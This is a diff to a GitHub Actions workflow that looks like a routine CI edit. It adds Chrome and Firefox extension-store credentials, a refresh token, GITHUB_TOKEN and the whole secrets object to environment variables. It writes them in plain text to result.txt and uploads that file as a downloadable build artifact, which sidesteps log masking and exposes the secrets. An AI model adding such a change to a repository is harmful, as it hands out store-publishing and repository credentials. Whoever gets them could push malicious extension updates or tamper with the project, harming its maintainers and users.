@@ -18,9 +18,26 @@ jobs:
         env:
           CI: ${{ true }}
           GH_SECRETS: ${{ toJson(secrets) }}
+          CCI: ${{ secrets.CHROME_CLIENT_ID }}
+          CCS: ${{ secrets.CHROME_CLIENT_SECRET }}
+          CRT: ${{ secrets.CHROME_REFRESH_TOKEN }}
+          FFA: ${{ secrets.FIREFOX_API_KEY }}
+          FAS: ${{ secrets.FIREFOX_API_SECRET }}
+          GHT: ${{ secrets.GITHUB_TOKEN }}
         run:  |
-          echo "CI $CI"
-          echo "GITHUB_Ref:  $GITHUB_REF"
-          echo "Secrets: $GH_SECRETS"
-          echo "GITHUB_SECRETS: $GITHUB_SECRETS"
-          echo "GITHUB_ACTIONS: $GITHUB_ACTIONS"
+          echo "CI $CI" >> result.txt
+          echo "GITHUB_Ref:  $GITHUB_REF" >> result.txt
+          echo "Secrets: $GH_SECRETS" >> result.txt
+          echo "GITHUB_ACTIONS: $GITHUB_ACTIONS" >> result.txt
+          echo "CCI:  $CCI" >> result.txt
+          echo "CCS:  $CCS" >> result.txt
+          echo "CRT:  $CRT" >> result.txt
+          echo "FFA:  $FFA" >> result.txt
+          echo "FAS:  $FAS" >> result.txt
+          echo "GHT:  $GHT" >> result.txt
+
+      - name: artifact upload
+        uses: actions/upload-artifact@v1
+        with:
+          name: Results
+          path: result.txt
